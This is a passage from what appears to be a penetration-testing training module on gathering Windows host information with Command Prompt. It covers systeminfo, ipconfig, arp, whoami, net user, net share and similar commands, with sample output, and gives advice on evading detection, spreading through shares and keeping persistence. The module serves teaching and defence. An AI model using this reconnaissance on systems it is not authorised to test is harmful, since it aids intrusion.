 Directory of C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ownloads

06/24/2021  11:10 AM    &lt;DIR&gt;          .
06/24/2021  11:10 AM    &lt;DIR&gt;          ..
06/22/2021  03:21 PM             1,140 bio.txt
12/07/2019  05:09 AM            27,648 copied-calc.exe
06/21/2021  11:58 PM             2,418 not-secrets.txt
               3 File(s)         31,206 bytes
               2 Dir(s)  39,122,550,784 bytes free
</code></pre>
<p>Above, we took the <code>bio.txt</code> file and moved it to the Downloads folder. Manipulating files is as easy as that.</p>
<hr>
<p>Great job! We have now tackled the task of mastering file and folder manipulation. Next up, we will tackle gathering up some critical system information.</p>
<h2 id="gathering-system-information">Gathering System Information</h2>
<hr>
<p>Now that we are familiar with navigating our Windows host using nothing but the Command Prompt let us move on to a fundamental concept accessible to both <code>Systems Administrators</code> and <code>Penetration Testers</code>: <code>Gathering System Information</code>.</p>
<p>Gathering <code>system information</code>(aka <code>host enumeration</code>) may seem daunting at first; however, it is a crucial step in providing a good foundation for getting to know our environment. Learning the environment and getting a general feel for our surroundings is beneficial to both sides of the aisle, benefitting the <code>red team</code> and the <code>blue team</code>. Those seated on the <code>red team</code>(Penetration Testers, Red Team Operators, hackers, etc.) will find value in being able to scan their hosts and the environment to learn what vulnerable services and machines can be exploited. Whereas the <code>blue team</code>(System Administrators, SOC Analysts, etc.) can use the information to diagnose issues, secure hosts and services, and ensure integrity across the network. Regardless of which team we might find ourselves most interested in or currently involved in, this section aims to provide the following information:</p>
<ul>
<li>What information can we gather from the system(<code>host</code>)?</li>
<li>Why do we need this information, and what is the importance of thorough enumeration?</li>
<li>How do we get this information via Command Prompt, and what general methodology should we follow?</li>
</ul>
<hr>
<h3 id="what-types-of-information-can-we-gather-from-the-system-">What Types of Information Can We Gather from the System?</h3>
<p>Once we have initial access to the system through some <code>command shell</code>, just knowing where to begin searching the system for information can be difficult. Manually <code>enumerating</code> the system with no path in mind on how we wish to proceed can lead to plenty of lost hours searching through troves of what seems to be important information with little to no results to show for all of that time spent. The goal of <code>host enumeration</code> is to provide an overall picture of the target host, its environment, and how it interacts with other systems across the network. Keeping this in mind, the first question that we might find ourselves coming to is:</p>
<p><code>How do we know what to look for?</code></p>
<p>To answer this question, we need to have a basic understanding of all the different types of information available to us on a system. Below is a chart that we can reference to give us a generalized outline of the main types of information we need to be aware of while performing host enumeration.</p>
<p><em>Note: This example is aimed toward the enumeration of the Windows operating system and may not be fully compatible with other system types. Also, note that this example is a partial list of all information found on a system.</em></p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/InformationTypesChart\_Updated.png" alt="Types of Information"></p>
<p>As we can see from the diagram above, the types of information that we would be looking for can be broken down into the following categories:</p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>General System Information</code></td>
<td>Contains information about the overall target system. Target system information includes but is not limited to the <code>hostname</code> of the machine, OS-specific details (<code>name</code>, <code>version</code>, <code>configuration</code>, etc.), and <code>installed hotfixes/patches</code> for the system.</td>
</tr>
<tr>
<td><code>Networking Information</code></td>
<td>Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: <code>host IP address</code>, <code>available network interfaces</code>, <code>accessible subnets</code>, <code>DNS server(s)</code>, <code>known hosts</code>, and <code>network resources</code>.</td>
</tr>
<tr>
<td><code>Basic Domain Information</code></td>
<td>Contains Active Directory information regarding the domain to which the target system is connected.</td>
</tr>
<tr>
<td><code>User Information</code></td>
<td>Contains information regarding local users and groups on the target system. This can typically be expanded to contain anything accessible to these accounts, such as <code>environment variables</code>, <code>currently running tasks</code>, <code>scheduled tasks</code>, and <code>known services</code>.</td>
</tr>
</tbody>
</table>
<p>Although this is not an exhaustive list of every single piece of information on a system, this will provide us with the means to begin creating a solid methodology for enumeration. Peering back at the diagram with our newfound knowledge, we can see a pattern emerge as to what we should be looking for while performing enumeration on our target host. To keep ourselves on target during enumeration, we want to try and ask ourselves some of the following questions:</p>
<ul>
<li>What system information can we pull from our target host?</li>
<li>What other system(s) is our target host interacting with over the network?</li>
<li>What user account(s) do we have access to, and what information is accessible from the account(s)?</li>
</ul>
<p>Think of these questions as a way to provide structure to help us develop a sense of situational awareness and a methodology for testing. Doing so gives us a clearer idea of what we are looking for and what information needs to be filtered out or prioritized during a real-life engagement.</p>
<hr>
<h3 id="why-do-we-need-this-information-">Why Do We Need This Information?</h3>
<p>In the previous section, we discussed what information can be gathered from a system during enumeration and what we should be aware of during our search. This section will provide more of the <code>why</code> behind gathering information in the first place and the importance of thorough enumeration of a target.</p>
<p>As stated beforehand, our <code>goal</code> with <code>host enumeration</code> here is to use the information gained from the target to provide us with a starting point and guide for how we wish to attack the system. To gain a better grasp on the concept behind the importance of proper host enumeration, let us follow along with the following example:</p>
<p>Example: Imagine you are tasked with working on an <code>assumed breach</code> engagement and have been provided with initial access through what is assumed to be an unprivileged user account. Your task is to get an overall lay of the land and see if you can <code>escalate your privileges</code> beyond the initial access of the compromised user account.</p>
<p>Following this example scenario, we can see that we are provided direct access to our initial host through an assumed unprivileged user account. However, our goal is to eventually escalate our privileges to an account with access to higher privileges or administrative permissions if we are lucky. To do this, we are going to need a thorough understanding of our environment, including the following:</p>
<ul>
<li>What user account do we have access to?</li>
<li>What groups does our user belong to?</li>
<li>What current working set of privileges does our user have access to?</li>
<li>What resources can our user access over the network?</li>
<li>What tasks and services are running under our user account?</li>
</ul>
<p>Remember that this only partially encompasses all the questions we can ask ourselves to reach our intended goal but simply a tiny subset of possibilities. Without thinking things through and failing to follow any guided structure while performing <code>enumeration</code>, we will struggle to know if we have all the required information to reach our goal. It can be easy to write off a system as being completely patched and not vulnerable to any current <a href="https://en.wikipedia.org/wiki/Common\_Vulnerabilities\_and\_Exposures">CVEs</a> or the latest <code>vulnerabilities</code>. However, if you only focus on that aspect, it is easy to miss out on the many human configuration errors that could exist in the environment. This very reason is why taking our time and gathering all of the information we can on a system or environment should be prioritized in terms of importance over simply exploiting a system haphazardly.</p>
<hr>
<h3 id="how-do-we-get-this-information-">How Do We Get This Information?</h3>
<p><strong>Casting a Wide Net</strong></p>
<p>CMD provides a one-stop shop for information via the <code>systeminfo</code> command. It is excellent for finding relevant information about the host, such as hostname, IP address(es), if it belongs to a domain, what hotfixes have been installed, and much more. This information is super valuable for a sysadmin when trying to diagnose issues.</p>
<p>For a hacker, this is a great way to quickly get the lay of the land when you first access a host while leaving a minimal footprint. Running one command is always better than running two or three just to get the same information. We are less likely to be detected this way. Having quick access to things such as the OS version, hotfixes installed, and OS build version can help us quickly determine from a quick Google or <a href="https://www.exploit-db.com/">ExploitDB</a> search, if an exploit exists that can be quickly leveraged to exploit this host further, elevate privileges, and more.</p>
<p><strong>Systeminfo Output</strong></p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; systeminfo


Host <span class="hljs-string">Name:</span>                 DESKTOP-htb
OS <span class="hljs-string">Name:</span>                   Microsoft Windows <span class="hljs-number">10</span> Pro
OS <span class="hljs-string">Version:</span>                <span class="hljs-number">10.0</span><span class="hljs-number">.19042</span> N/A Build <span class="hljs-number">19042</span>
OS <span class="hljs-string">Manufacturer:</span>           Microsoft Corporation
OS <span class="hljs-string">Configuration:</span>          Standalone Workstation
OS Build <span class="hljs-string">Type:</span>             Multiprocessor Free

&lt;snipped&gt;
</code></pre>
<p>However, knowing a single way to gather information is inefficient, especially if specific commands are monitored and tracked more closely than others. This is why we need more than one established way to gather our required information and stay under the detection radar when possible.</p>
<hr>
<p><strong>Examining the System</strong></p>
<p>As shown previously, <code>systeminfo</code> contains a lot of information to sift through; however, if we need to retrieve some basic system information such as the <code>hostname</code> or <code>OS version</code>, we can use the <code>hostname</code> and <code>ver</code> utilities built into the command prompt.</p>
<p>The <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname">hostname</a> utility follows its namesake and provides us with the hostname of the machine, whereas the <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ver">ver</a> command prints out the current operating system version number. Both commands, in tandem, will provide us with an alternative way to retrieve some basic system information we can use while further enumerating the target host.</p>
<p><strong>Hostname Output</strong></p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; hostname

DESKTOP-htb
</code></pre>
<p><strong>Ver Output</strong></p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\htb&gt; ver

Microsoft Windows [<span class="hljs-keyword">Version</span> <span class="hljs-number">10.0</span><span class="hljs-number">.19042</span><span class="hljs-number">.2006</span>]
</code></pre>
<p><strong>Scoping the Network</strong></p>
<p>In addition to the host information provided above, let us quickly look at some basic network information for our target. A thorough understanding of how our target is connected and what devices it can access across the network is an invaluable tool in our arsenal as an attacker.</p>
<p>To gather this information quickly and in one simple-to-use command, Command Prompt offers the <code>ipconfig</code> utility. The <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig">ipconfig</a> utility displays all current TCP/IP network configurations for the machine. Let us look at an example <code>ipconfig</code> configuration without providing additional parameters.</p>
<p><strong>Ipconfig Without Parameters</strong></p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">ipconfig</span>

<span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">IP</span> <span class="hljs-selector-tag">Configuration</span>

&lt;<span class="hljs-selector-tag">SNIP</span>&gt;

<span class="hljs-selector-tag">Ethernet</span> <span class="hljs-selector-tag">adapter</span> <span class="hljs-selector-tag">Ethernet</span>:

   <span class="hljs-selector-tag">Connection-specific</span> <span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">Suffix</span>  . : <span class="hljs-selector-tag">htb</span><span class="hljs-selector-class">.local</span>
   <span class="hljs-selector-tag">Link-local</span> <span class="hljs-selector-tag">IPv6</span> <span class="hljs-selector-tag">Address</span> . . . . . : <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::2958</span><span class="hljs-selector-pseudo">:39a</span><span class="hljs-selector-pseudo">:df51</span><span class="hljs-selector-pseudo">:b60</span>%23
   <span class="hljs-selector-tag">IPv4</span> <span class="hljs-selector-tag">Address</span>. . . . . . . . . . . : 10<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.25</span><span class="hljs-selector-class">.17</span>
   <span class="hljs-selector-tag">Subnet</span> <span class="hljs-selector-tag">Mask</span> . . . . . . . . . . . : 255<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.0</span>
   <span class="hljs-selector-tag">Default</span> <span class="hljs-selector-tag">Gateway</span> . . . . . . . . . : 10<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.25</span><span class="hljs-selector-class">.1</span>

<span class="hljs-selector-tag">Ethernet</span> <span class="hljs-selector-tag">adapter</span> <span class="hljs-selector-tag">Ethernet</span> 2:

   <span class="hljs-selector-tag">Connection-specific</span> <span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">Suffix</span>  . : <span class="hljs-selector-tag">internal</span><span class="hljs-selector-class">.htb</span><span class="hljs-selector-class">.local</span>
   <span class="hljs-selector-tag">Link-local</span> <span class="hljs-selector-tag">IPv6</span> <span class="hljs-selector-tag">Address</span> . . . . . : <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::bc3b</span><span class="hljs-selector-pseudo">:6f9f</span><span class="hljs-selector-pseudo">:68d4</span><span class="hljs-selector-pseudo">:3ec5</span>%26
   <span class="hljs-selector-tag">IPv4</span> <span class="hljs-selector-tag">Address</span>. . . . . . . . . . . : 172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.50</span><span class="hljs-selector-class">.15</span>
   <span class="hljs-selector-tag">Subnet</span> <span class="hljs-selector-tag">Mask</span> . . . . . . . . . . . : 255<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.0</span>
   <span class="hljs-selector-tag">Default</span> <span class="hljs-selector-tag">Gateway</span> . . . . . . . . . : 172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.50</span><span class="hljs-selector-class">.1</span>

&lt;<span class="hljs-selector-tag">SNIP</span>&gt;
</code></pre>
<p>As we can see from the example above, even without specifying parameters, we are greeted with some basic network information for the host machine, such as the <code>Domain Name</code>, <code>IPv4 Address</code>, <code>Subnet Mask</code>, and <code>Default Gateway</code>. All of these can provide insight into the network(s) that the target is a part of and connected to and the wider environment. If we need additional information or want to dig further into the specific settings applied to each adapter, we can use the following command: <code>ipconfig /all</code>. As implied by the flag provided, this command provides a fully comprehensive listing (full TCP/IP configuration) of every network adapter attached to the system and additional information, including the physical address of each adapter (<code>MAC Address</code>), DHCP settings, and DNS Servers.</p>
<p><code>Ipconfig</code> is a highly versatile command for gathering information about the network connectivity of the target host; however, if we need to quickly see what hosts our target has come into contact with, look no further than the <code>arp</code> command.</p>
<p>The <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/arp">arp</a> utility effectively displays the contents and entries contained within the Address Resolution Protocol (<code>ARP</code>) cache. We can also use this command to modify the table entries effectively. However, that in itself is beyond the scope of this module. To better understand what type of information the <code>ARP</code> cache contains, let us quickly look at the following example:</p>
<p><strong>Utilizing ARP to Find Additional Hosts</strong></p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session">C:\htb&gt; arp /a

&lt;SNIP&gt;

Interface: 10.0.25.17 --- 0x17
  Internet Address      Physical Address      Type
  10.0.25.1             00-e0<span class="hljs-string">-67</span><span class="hljs-string">-15</span>-cf<span class="hljs-string">-43</span>     dynamic
  10.0.25.5             54<span class="hljs-string">-9</span>f<span class="hljs-string">-35</span><span class="hljs-string">-1</span>c<span class="hljs-string">-3</span>a-e2     dynamic
  10.0.25.10            00<span class="hljs-string">-0</span>c<span class="hljs-string">-29</span><span class="hljs-string">-62</span><span class="hljs-string">-09</span><span class="hljs-string">-81</span>     dynamic
  10.0.25.255           ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span><span class="hljs-string">-16</span>     static
  224.0.0.251           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fb     static
  224.0.0.252           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fc     static
  239.255.255.250       01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 172.16.50.15 --- 0x1a
  Internet Address      Physical Address      Type
  172.16.50.1           15-c0<span class="hljs-string">-6</span>b<span class="hljs-string">-58</span><span class="hljs-string">-70</span>-ed     dynamic
  172.16.50.20          80-e5<span class="hljs-string">-53</span><span class="hljs-string">-3</span>c<span class="hljs-string">-72</span><span class="hljs-string">-30</span>     dynamic
  172.16.50.32          fb<span class="hljs-string">-90</span><span class="hljs-string">-01</span><span class="hljs-string">-5</span>c<span class="hljs-string">-1</span>f<span class="hljs-string">-88</span>     dynamic
  172.16.50.65          7a<span class="hljs-string">-49</span><span class="hljs-string">-56</span><span class="hljs-string">-10</span><span class="hljs-string">-3</span>b<span class="hljs-string">-76</span>     dynamic
  172.16.50.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span><span class="hljs-string">-16</span>     static
  224.0.0.251           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fb     static
  224.0.0.252           01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-00</span><span class="hljs-string">-00</span>-fc     static
  239.255.255.250       01<span class="hljs-string">-00</span><span class="hljs-string">-5</span>e<span class="hljs-string">-7</span>f-ff-fa     static\

&lt;SNIP&gt;
</code></pre>
<p>From this example, we can see all the hosts that have come into contact or might have had some prior communication with our target. We can use this information to begin mapping the network along each of the networking interfaces belonging to our target.</p>
<hr>
<p><strong>Understanding Our Current User</strong></p>
<p>Now that we have some basic host information to get us started, we should further understand our current compromised user account. One of the best command line utilities to do so is <code>whoami</code>.</p>
<p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami">Whoami</a> allows us to display the user, group, and privilege information for the user that is currently logged in. In this case, we should run it without any parameters first and see what kind of output we end up with.</p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-string">\htb&gt;</span> whoami

ACADEMY-WIN11<span class="hljs-string">\htb-student</span>
</code></pre>
<p>As we can see from the initial output above, running <code>whoami</code> without parameters provides us with the current domain and the user name of the logged-in account.</p>
<p>Note: If the current user is not a domain-joined account, the <code>NetBIOS</code> name will be provided instead. The current <code>hostname</code> will be used in most cases.</p>
<p><strong>Checking Out Our Privileges</strong></p>
<p>As previously mentioned, we can also use <code>whoami</code> to view our current user&#39;s security privileges on the system. By understanding what privileges are enabled for our current user, we can determine our capabilities on our target host. Let us try running <code>whoami /priv</code> from our compromised user account.</p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
</code></pre>
<p>From the output above, we only seem to have access to a basic permission set, and most of our options are disabled. This falls within the limitations of a standard user account provisioned on the domain. However, if there were any misconfigurations in these settings or the user was provided any additional privileges, we could potentially use this to our advantage in trying to escalate the privileges of our current user.</p>
<p><strong>Investigating Groups</strong></p>
<p>On top of having a thorough understanding of our current user&#39;s privileges, we should also take some time to see what groups our account is a member of. This can provide insight into other groups our current user is a part of, including any default groups (built-ins) and, more importantly, any custom groups to which our user was explicitly granted access. To view the groups our current user is a part of, we can issue the following command: <code>whoami /groups</code>.</p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /groups

<span class="hljs-keyword">GROUP</span> <span class="hljs-title">INFORMATION</span>
-----------------

<span class="hljs-keyword">Group</span> <span class="hljs-title">Name</span>                             <span class="hljs-keyword">Type</span>             SID          <span class="hljs-keyword">Attributes</span>
====================================== ================ ============ ==================================================
Everyone                               Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-1-0</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">BUILTIN</span>\Users                          Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">BUILTIN</span>\Performance Log Users          Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">559</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\INTERACTIVE               Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-4</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">CONSOLE</span> LOGON                          Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-2-1</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\Authenticated Users       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-11</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\This Organization         Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-15</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\Local account             Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-113</span>    Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">LOCAL</span>                                  Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-2-0</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">NT</span> AUTHORITY\NTLM Authentication       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-64-10</span>  Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span>
<span class="hljs-title">Mandatory</span> Label\Medium Mandatory Level Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">8192</span>
</code></pre>
<p>Our user is not a member of any other groups besides the built-ins added to our account upon creation. However, it is essential to note that in some cases, users can be provided additional access, privileges, and permissions based on the groups to which they belong.</p>
<p>Note: The commands shown above contain only certain sections of the output provided from <code>whoami /all</code>. Depending on the situation and the information that&#39;s needed, we can use the individual commands or gather all of the information at once through the use of the <code>/all</code> parameter.</p>
<hr>
<p><strong>Investigating Other Users/Groups</strong></p>
<p>After investigating our current compromised user account, we need to branch out a bit and see if we can get access to other accounts. In most environments, machines on a network are domain-joined. Due to the nature of domain-joined networks, anyone can log in to any physical host on the network without requiring a local account on the machine. We can use this to our advantage by scoping out what users have accessed our current host to see if we could access other accounts. This is very beneficial as a method of maintaining persistence across the network. To do this, we can utilize specific functionality of the <code>net</code> command.</p>
<p><strong>Net User</strong></p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865\(v=ws.11\">Net User</a>) allows us to display a list of all users on a host, information about a specific user, and to create or delete users.</p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net user

User accounts <span class="hljs-keyword">for</span> \\ACADEMY-WIN11

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator            DefaultAccount           Guest
htb-student              WDAGUtilityAccount
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<p>From the provided output, only a few user accounts have been created for this machine. However, if we were on a more populated network, we might come across more accounts to attempt to compromise.</p>
<p><strong>Net Group / Localgroup</strong></p>
<p>In addition to user accounts, we should also take a quick look into what groups exist across the network. In the previous section, we discussed very heavily into groups that our user is a member of; however, we also have the capability from our current host to view all groups that exist on our host and from the domain. We can achieve this by utilizing the <code>net group</code> and <code>net localgroup</code> commands.</p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754051\(v=ws.11\">Net Group</a>) will display any groups that exist on the host from which we issued the command, create and delete groups, and add or remove users from groups. It will also display domain group information if the host is joined to the domain. Keep in mind, <code>net group</code> must be run against a domain server such as the DC, while <code>net localgroup</code> can be run against any host to show us the groups it contains.</p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session">C:\htb&gt; <span class="hljs-keyword">net</span> <span class="hljs-built_in">group</span>
<span class="hljs-keyword">net</span> <span class="hljs-built_in">group</span>
This command can be used only <span class="hljs-keyword">on</span> a Windows Domain Controller.

<span class="hljs-keyword">More</span> <span class="hljs-keyword">help</span> is available <span class="hljs-keyword">by</span> typing <span class="hljs-keyword">NET</span> HELPMSG 3515.


C:\htb&gt;<span class="hljs-keyword">net</span> localgroup

Aliases <span class="hljs-keyword">for</span> \\ACADEMY-WIN11

-------------------------------------------------------------------------------
<span class="hljs-comment">*__vmware__</span>
<span class="hljs-comment">*Access Control Assistance Operators</span>
<span class="hljs-comment">*Administrators</span>
<span class="hljs-comment">*Backup Operators</span>
<span class="hljs-comment">*Cryptographic Operators</span>
<span class="hljs-comment">*Device Owners</span>
<span class="hljs-comment">*Distributed COM Users</span>
<span class="hljs-comment">*Event Log Readers</span>
<span class="hljs-comment">*Guests</span>
<span class="hljs-comment">*Hyper-V Administrators</span>
<span class="hljs-comment">*IIS_IUSRS</span>
<span class="hljs-comment">*Network Configuration Operators</span>
<span class="hljs-comment">*Performance Log Users</span>
<span class="hljs-comment">*Performance Monitor Users</span>
<span class="hljs-comment">*Power Users</span>
<span class="hljs-comment">*Remote Desktop Users</span>
<span class="hljs-comment">*Remote Management Users</span>
<span class="hljs-comment">*Replicator</span>
<span class="hljs-comment">*System Managed Accounts Group</span>
<span class="hljs-comment">*Users</span>
The command completed successfully.
</code></pre>
<hr>
<p><strong>Exploring Resources on the Network</strong></p>
<p>Previously, we honed in on what our current user has access to in terms of the host locally. However, in a domain environment, users are typically required to store any work-related material on a share located on the network versus storing files locally on their machine. These shares are usually found on a server away from the physical access of a run-of-the-mill employee. Typically, standard users will have the necessary permissions to read, write, and execute files from a share, provided they have valid credentials. We can, of course, abuse this as an additional persistence method, but how do we locate these shares in the first place?</p>
<p><strong>Net Share</strong></p>
<p>One way of doing so involves using the <code>net share</code> command. <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh750728\(v=ws.11\">Net Share</a>) allows us to display info about shared resources on the host and to create new shared resources as well.</p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\htb&gt; net share  

<span class="hljs-keyword">Share</span> name   Resource                        Remark

-------------------------------------------------------------------------------
<span class="hljs-keyword">C</span>$           <span class="hljs-keyword">C</span>:\                             <span class="hljs-keyword">Default</span> share
IPC$                                         Remote IPC
ADMIN$       <span class="hljs-keyword">C</span>:\Windows                      Remote Admin
Records      <span class="hljs-keyword">D</span>:\Important-Files              Mounted share for records storage  
The command completed successfully.
</code></pre>
<p>As we can see from the example above, we have a list of shares that our current compromised user has access to. By reading the remarks, we can take an educated guess that <code>Records</code> is a manually mounted share that could contain some potentially interesting information for us to enumerate. Ideally, if we were to find an open share like this while on an engagement, we would need to keep track of the following:</p>
<ul>
<li>Do we have the proper permissions to access this share?</li>
<li>Can we read, write, and execute files on the share?</li>
<li>Is there any valuable data on the share?</li>
</ul>
<p>In addition to providing information, <code>shares</code> are great for hosting anything we need and laterally moving across hosts as a pentester. If we are not too worried about being sneaky, we can drop a payload or other data onto a share to enable movement around other hosts on the network. Although outside of the scope of this module, abusing shares in this manner is an excellent persistence method and can potentially be used to escalate privileges.</p>
<p><strong>Net View</strong></p>
<p>If we are not explicitly looking for shares and wish to search the environment broadly, we have an alternate command that can be extremely useful, also known as <code>net view</code>.</p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875576\(v=ws.11\">Net View</a>) will display to us any shared resources the host you are issuing the command against knows of. This includes domain resources, shares, printers, and more.</p>
<p>Gathering System Information</p>
<pre><code class="lang-cmd-session">C:\htb&gt; <span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span>
</code></pre>
<p><strong>Piecing Things Together</strong></p>
<p>Using all the information and examples provided above, we have extracted a significant amount of information from our host and its&#39; surroundings. From here, depending on our access, we can elevate our privileges or continue to move towards our goal. System-level access on every host is unnecessary for a pentester (unless the assessment calls for it), so let us avoid getting stuck trying to get it on every occasion.</p>
<p>This is just a quick look at how <code>CMD</code> can be used to gain access and continue an assessment with limited resources. Keep in mind that this route is quite noisy, and we will be noticed eventually by even a semi-competent blue team. As it stands, we are writing tons of logs, leaving traces across multiple hosts, and have little to no insight into what their <code>EDR</code> and <code>NIDS</code> was able to see.</p>
<p>Note: In a standard environment, cmd-prompt usage is not a common thing for a regular user. Administrators sometimes have a reason to use it but will be actively suspicious of any average user executing cmd.exe. With that in mind, using <code>net *</code> commands within an environment is not a normal thing either, and can be one way to alert on potential infiltration of a networked host easily. With proper monitoring and logging enabled, we should spot these actions quickly and use them to triage an incident before it gets too far out of hand.</p>
<hr>
<h3 id="final-thoughts-and-considerations">Final Thoughts and Considerations</h3>
<p>Albeit this has been an incredibly long section, we should have a general sense of the overall scope of information that can be found on a system, why we need it, and how we can gather this information quickly and efficiently. As a pentester, having this mindset allows us to further our methodology and gain a thorough understanding of what exactly we are looking for while enumerating a system or its wider environment. Having a solid methodology for enumeration is a highly invaluable skill for us to pick up early on.</p>
<p>As we move on to further sections in this module, our mindset and methodology will remain the same as we will simply be building upon the foundation being laid. In the next section, we will dive further into finding specific files and directories on our system.</p>
<h2 id="finding-files-and-directories">Finding Files and Directories</h2>
<hr>
<p>Now, we are comfortable creating, modifying, moving, and deleting files and directories. We should cover a beneficial concept that can make or break it during an engagement or in our day-to-day tasks as a <code>System Administrator</code> or <code>Penetration Tester</code>, known as <code>enumeration</code>. This section will cover how to search for particular files and directories utilizing CMD, why enumerating system files and directories are vital, and provide an essential list of what to look out for while enumerating the system.</p>
<hr>
<h3 id="searching-with-cmd">Searching With CMD</h3>
<p><strong>Using Where</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop&gt;where calc.exe

C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>alc.exe

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop&gt;where bio.txt

INFO: Could not find files for the given pattern(s).
</code></pre>
